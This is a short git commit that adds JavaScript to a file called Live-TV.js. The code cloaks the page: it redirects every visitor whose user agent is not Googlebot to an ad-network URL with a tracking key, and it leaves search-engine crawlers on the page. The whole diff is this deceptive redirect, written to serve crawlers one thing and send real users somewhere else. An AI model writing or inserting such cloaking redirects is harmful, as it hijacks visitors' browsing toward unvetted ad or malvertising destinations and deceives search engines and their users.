5a48393e799af6245742b84e8c220f5a6d475096
channeltoday <o.nlinechanneltoday@gmail.com>
2026-09-12 16:02:47 +0600

    Add user-agent check for redirection
    Redirect normal users while logging for crawlers.

--- Live-TV.js
+++ Live-TV.js
@@ -1,1 +1,8 @@
-
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://www.profitableratecpmnetwork.com/mwwvd0gmy?key=0f1ae38904cb127d86c661772c29a5e8";
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
